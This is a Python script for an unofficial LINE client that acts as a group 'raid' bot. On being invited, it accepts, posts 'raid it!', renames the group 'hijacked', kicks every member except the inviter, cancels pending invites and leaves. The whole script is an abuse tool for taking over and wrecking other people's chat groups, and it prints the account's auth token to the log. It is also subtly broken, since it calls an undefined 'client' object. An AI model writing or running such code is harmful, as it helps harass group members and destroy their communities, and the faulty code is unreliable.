from Linephu.linepy import *
from Linephu.akad.ttypes import *




botStart = time.time()

cl = LINE()
cl.log("Auth Token : " + str(cl.authToken))


clMID = cl.profile.mid

clProfile = cl.getProfile()
mid = cl.getProfile().mid
lineSettings = cl.getSettings()

oepoll = OEPoll(client)

invtag = []

def NOTIFIED_INVITE_INTO_GROUP(op):
    try:
        client.acceptGroupInvitation(op.param1)
        invtag.append(op.param2)
        client.sendMessage(op.param1, "荒らせ!!")
    except Exception as e:
        print(e)
        print("\n\nNOTIFIED_INVITE_INTO_GROUP\n\n")
        return
    
    
def SEND_MESSAGE(op):
    msg = op.message
    try:
        if msg.toType == 2:
            if msg.contentType == 0:
                if msg.text == "荒らせ!!":
                    print("荒らしスタート")
                    _name = msg.text.replace("荒らせ!!","")
                    group = client.getGroup(msg.to)
                    group.name = "乗っ取った()"
                    client.updateGroup(group)
                    targets = []
                    for g in group.members:
                        if _name in g.displayName:
                            targets.append(g.mid)
                    if targets == []:
                        client.leaveGroup(msg.to)
                    else:
                        for target in targets:
                            try:
                                if target in invtag:
                                    pass
                                else:
                                    client.kickoutFromGroup(msg.to,[target])
                                    print (msg.to,[g.mid])
                            except:
                               group = client.getGroup(op.param1)
                               groupinvitingmembersmid = [contact.mid for contact in group.invitee]
                               for _mid in groupinvitingmembersmid:
                                   client.cancelGroupInvitation(op.param1, [_mid])
                                   time.sleep(0.5)
                    client.leaveGroup(msg.to)
        else:
            pass
        
    except Exception as e:
        print(e)
        print("\n\nSEND_MESSAGE\n\n")
        return
    
oepoll.addOpInterruptWithDict({
    OpType.NOTIFIED_INVITE_INTO_GROUP: NOTIFIED_INVITE_INTO_GROUP,
    OpType.SEND_MESSAGE: SEND_MESSAGE
})


while True:
    oepoll.trace()